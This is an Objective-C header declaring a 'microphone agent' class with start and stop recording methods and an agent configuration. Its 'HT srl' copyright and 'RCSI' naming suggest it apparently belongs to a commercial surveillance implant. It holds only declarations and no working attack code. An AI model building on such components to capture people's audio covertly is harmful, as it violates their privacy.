/*
 * RCSIAgentMicrophone.h
 *  Microphone Agent - acts as a controller for the RCSIMicrophoneRecorder
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSIAgentMicrophone_h__
#define __RCSIAgentMicrophone_h__

#import "RCSICommon.h"
#import "RCSIMicrophoneRecorder.h"


@interface RCSIAgentMicrophone : NSObject <Agents>
{
@private
  NSMutableDictionary *mAgentConfiguration;
  BOOL                 mIsRunning;

@private
  RCSIMicrophoneRecorder *mRecorder;
  BOOL                    mPlaybackWasInterrupted;
  BOOL                    mPlaybackWasPaused;

@private
  CFStringRef             mRecordFilePath;
}

@property (retain, readwrite) NSMutableDictionary    *mAgentConfiguration;
@property (readonly)          RCSIMicrophoneRecorder *mRecorder;
@property (readonly)          BOOL                    mIsRunning;
@property                     BOOL                    mPlaybackWasInterrupted;

+ (RCSIAgentMicrophone *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (id)init;

- (void)startRecord;
- (void)stopRecord;
- (void)setupAudioQueue;

@end

#endif